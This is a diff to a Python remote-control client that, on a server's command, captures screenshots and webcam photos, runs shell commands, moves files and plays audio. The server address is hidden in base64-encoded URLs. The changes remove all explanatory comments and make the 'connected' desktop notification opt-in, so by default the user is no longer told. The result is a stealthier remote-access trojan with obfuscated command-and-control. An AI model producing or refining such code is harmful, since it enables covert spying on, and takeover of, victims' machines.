@@ -26,7 +26,6 @@ import websockets
 from websockets.asyncio.client import ClientConnection
 
 
-# Polyfill asyncio.to_thread для Python 3.8 (МосОС / ALT Linux)
 if not hasattr(asyncio, "to_thread"):
     import contextvars
     import functools
@@ -40,7 +39,6 @@ if not hasattr(asyncio, "to_thread"):
     asyncio.to_thread = _to_thread
 
 
-# --- Логирование ---
 logging.basicConfig(
     level=logging.INFO,
     format="[%(asctime)s] [%(levelname)s] %(name)s: %(message)s",
@@ -50,8 +48,6 @@ logging.basicConfig(
 logger = logging.getLogger("client")
 
 
-# --- Конфигурация ---
-# Анонимный эндпоинт для разрешения адреса сервера (без упоминания логина в открытом виде)
 _RESOLVER_B64 = b"aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYXcvNWVkM2RmMTE4MTcxZWM5YmMwY2U4ZDM3YmMwZGNkMjgvc2VydmVyX3VybC50eHQ="
 _FALLBACK_B64 = b"d3NzOi8vYW5hbHlzdHMtbW90aGVycy1wb3dlci1jaHJvbmljbGUudHJ5Y2xvdWRmbGFyZS5jb20="
 
@@ -79,26 +75,24 @@ def resolve_server_url() -> str:
 
     return base64.b64decode(_FALLBACK_B64).decode("ascii")
 
-# Токен аутентификации WebSocket (Pre-Shared Key)
+
 AUTH_TOKEN = os.environ.get(
     "REMOTE_AUTH_TOKEN",
     os.environ.get("AUTH_TOKEN", "default-insecure-token-change-me"),
 )
 
-# Параметры переподключения (Exponential Backoff + Full Jitter)
+
 INITIAL_RECONNECT_DELAY = 1.0
 MAX_RECONNECT_DELAY = 60.0
 BACKOFF_FACTOR = 2.0
 
-# Лимиты передачи файлов
-MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 МБ (лимит Telegram)
+
+MAX_FILE_SIZE = 50 * 1024 * 1024
 ALLOWED_BASE_DIR: Optional[str] = os.environ.get("ALLOWED_BASE_DIR")
 
-# Stateful рабочая директория для shell-команд (только Linux)
+
 CURRENT_DIR: str = os.path.expanduser("~")
 
-
-# --- Сбор системной информации и медиа ---
 
 def take_screenshot_bytes() -> bytes:
     with mss.mss() as sct:
@@ -113,7 +107,7 @@ def take_webcam_photo() -> bytes:
         raise RuntimeError("Cannot open default webcam")
 
     try:
-        # Небольшой прогрев для стабилизации экспозиции
+
         for _ in range(8):
             cap.read()
 
@@ -169,7 +163,7 @@ def set_system_volume(level: int) -> None:
     if system == "Linux":
         pct = f"{level}%"
 
-        # 1. pactl (PulseAudio / PipeWire Pulse)
+
         if shutil.which("pactl"):
             try:
                 r = subprocess.run(
@@ -185,7 +179,7 @@ def set_system_volume(level: int) -> None:
             except Exception:
                 pass
 
-        # 2. wpctl (WirePlumber / PipeWire)
+
         if shutil.which("wpctl"):
             try:
                 vol_float = f"{level / 100.0:.2f}"
@@ -202,10 +196,7 @@ def set_system_volume(level: int) -> None:
             except Exception:
                 pass
 
-        # 3. amixer с PulseAudio бэкендом (-D pulse)
-        # В десктопных Linux (KDE Plasma, МосОС, ROSA, Ubuntu) графический апплет громкости
-        # работает через PulseAudio. Вызов `amixer -D pulse sset Master X%` задает точные
-        # линейные проценты (0-65536) напрямую в PulseAudio без логарифмических искажений.
+
         if shutil.which("amixer"):
             try:
                 cmd = ["amixer", "-D", "pulse", "sset", "Master", pct]
@@ -217,7 +208,7 @@ def set_system_volume(level: int) -> None:
             except Exception:
                 pass
 
-            # 4. Чистый ALSA hardware mixer (если PulseAudio не запущен)
+
             try:
                 r_get = subprocess.run(["amixer", "get", "Master"], capture_output=True, text=True, timeout=5)
                 if r_get.returncode == 0:
@@ -236,7 +227,7 @@ def set_system_volume(level: int) -> None:
             except Exception as alsa_err:
                 logger.debug("Discrete ALSA step volume calculation failed: %s", alsa_err)
 
-            # 5. amixer -M (mapped natural volume) fallback
+
             try:
                 sub_r = subprocess.run(
                     ["amixer", "-M", "set", "Master", pct, "unmute" if level > 0 else "mute"],
@@ -249,7 +240,7 @@ def set_system_volume(level: int) -> None:
             except Exception:
                 pass
 
-            # 6. Стандартный fallback
+
             for cmd in [
                 ["amixer", "set", "Master", pct, "unmute" if level > 0 else "mute"],
                 ["amixer", "sset", "Master", pct, "unmute" if level > 0 else "mute"],
@@ -279,7 +270,7 @@ def play_audio_file(filepath: str) -> None:
 
     played = False
     try:
-        # Попытка 1: pygame.mixer
+
         try:
             pygame.mixer.init()
             try:
@@ -299,7 +290,7 @@ def play_audio_file(filepath: str) -> None:
         if played:
             return
 
-        # Попытка 2: Системные плееры в Linux (ffplay, mpv, cvlc, aplay)
+
         if system == "Linux":
             if shutil.which("ffplay"):
                 r = subprocess.run(["ffplay", "-nodisp", "-autoexit", "-loglevel", "quiet", filepath], timeout=60)
@@ -321,7 +312,7 @@ def play_audio_file(filepath: str) -> None:
         if not played:
             raise RuntimeError("Не удалось воспроизвести аудио ни через pygame, ни через системные плееры.")
     finally:
-        # Если это временный переданный файл — подчищаем его
+
         if "remote_audio_" in filepath:
             try:
                 os.remove(filepath)
@@ -334,13 +325,13 @@ def minimize_all_windows() -> None:
     system = platform.system()
 
     if system == "Windows":
-        import win32com.client  # pywin32
+        import win32com.client
         shell = win32com.client.Dispatch("Shell.Application")
         shell.MinimizeAll()
         return
 
     if system == "Linux":
-        # 1. Если установлен wmctrl
+
         if shutil.which("wmctrl"):
             try:
                 r = subprocess.run(["wmctrl", "-k", "on"], capture_output=True, text=True, timeout=5)
@@ -349,7 +340,7 @@ def minimize_all_windows() -> None:
             except Exception:
                 pass
 
-        # 2. KDE Plasma / KWin (МосОС / ROSA Linux / Kubuntu)
+
         if shutil.which("qdbus"):
             for qcmd in [
                 ["qdbus", "org.kde.kglobalaccel", "/component/kwin", "invokeShortcut", "Show Desktop"],
@@ -362,7 +353,7 @@ def minimize_all_windows() -> None:
                 except Exception:
                     pass
 
-        # 3. xdotool
+
         if shutil.which("xdotool"):
             for shortcut in [["xdotool", "key", "super+d"], ["xdotool", "key", "ctrl+alt+d"]]:
                 try:
@@ -372,7 +363,7 @@ def minimize_all_windows() -> None:
                 except Exception:
                     pass
 
-        # 4. Прямой X11 вызов через libX11.so.6 (работает на любом X11-десктопе без внешних бинарников)
+
         try:
             import ctypes
             x11 = ctypes.cdll.LoadLibrary("libX11.so.6")
@@ -395,7 +386,7 @@ def minimize_all_windows() -> None:
                 e.x.w = r
                 e.x.m = a
                 e.x.f = 32
-                e.x.data[0] = 1 # 1 = show desktop
+                e.x.data[0] = 1
                 mask = (1 << 20) | (1 << 19)
                 x11.XSendEvent(d, r, False, ctypes.c_long(mask), ctypes.byref(e))
                 x11.XFlush(d)
@@ -524,8 +515,6 @@ def show_desktop_notification(title: str, message: str) -> None:
         logger.debug("Failed to show desktop notification: %s", exc)
 
 
-# --- Безопасная валидация путей и чтение файлов (защита от Path Traversal и OOM) ---
-
 def validate_and_resolve_file_path(
     path_str: str,
     current_dir: str,
@@ -555,7 +544,7 @@ def validate_and_resolve_file_path(
     except Exception as exc:
         return None, f"Ошибка разрешения пути: {exc}"
 
-    # Ограничение корневой директории, если задана
+
     if allowed_base_dir:
         try:
             base = Path(allowed_base_dir).resolve()
@@ -563,7 +552,7 @@ def validate_and_resolve_file_path(
         except ValueError:
             return None, f"Доступ запрещен: путь вне разрешенной директории ({allowed_base_dir})"
 
-    # Защита от чтения критических системных файлов и виртуальных файловых систем
+
     posix_path = resolved.as_posix()
     BLOCKED_DEVICE_PREFIXES = ("/dev/", "/proc/", "/sys/")
     BLOCKED_SYSTEM_PREFIXES = ("/etc/sudoers.d/",)
@@ -649,8 +638,6 @@ async def execute_shell_command(cmd_str: str) -> str:
     except Exception as exc:
         return f"[ERROR] Failed to execute command: {exc}"
 
-
-# --- Диспетчер команд клиента ---
 
 class CommandDispatcher:
     """Реестр обработчиков команд сервера."""
@@ -794,7 +781,7 @@ async def cmd_play_audio(ws: ClientConnection, command: dict) -> None:
     b64_data = command.get("data")
     filepath = command.get("file_path")
 
-    # Если аудио передано с сервера в бинарном виде (Base64):
+
     if b64_data:
         try:
             audio_bytes = base64.b64decode(b64_data)
@@ -1026,8 +1013,6 @@ async def cmd_shell(ws: ClientConnection, command: dict) -> None:
             )
 
 
-# --- Цикл обработки команд сервера ---
-
 async def handle_server_commands(ws: ClientConnection) -> None:
     logger.info("Ready. Waiting for commands as client_id=%s", CLIENT_ID)
     async for message in ws:
@@ -1048,8 +1033,6 @@ async def handle_server_commands(ws: ClientConnection) -> None:
         await dispatcher.dispatch(ws, command)
 
 
-# --- Основной цикл подключения с Exponential Backoff + Full Jitter ---
-
 async def run_client() -> None:
     current_delay = INITIAL_RECONNECT_DELAY
 
@@ -1069,17 +1052,18 @@ async def run_client() -> None:
                 await ws.send(json.dumps(hello_payload))
                 logger.info("Initial sys_info with auth token sent successfully")
 
-                # Успешное подключение и отправка рукопожатия — сбрасываем задержку
+
                 current_delay = INITIAL_RECONNECT_DELAY
 
-                # Всплывающее уведомление на рабочем столе клиента
-                asyncio.create_task(
-                    asyncio.to_thread(
-                        show_desktop_notification,
-                        "Remote Access",
-                        f"Клиент успешно подключен к серверу!\nID: {CLIENT_ID}",
+
+                if os.environ.get("ENABLE_NOTIFICATION") == "1":
+                    asyncio.create_task(
+                        asyncio.to_thread(
+                            show_desktop_notification,
+                            "Remote Access",
+                            f"Клиент успешно подключен к серверу!\nID: {CLIENT_ID}",
+                        )
                     )
-                )
 
                 await handle_server_commands(ws)
 
@@ -1091,7 +1075,7 @@ async def run_client() -> None:
         except Exception as exc:
             logger.error("Unexpected client error: %s", exc, exc_info=True)
 
-        # Full Jitter backoff: случайная задержка от 0.5 до current_delay
+
         sleep_duration = (
             random.uniform(0.5, current_delay)
             if current_delay > 0.5
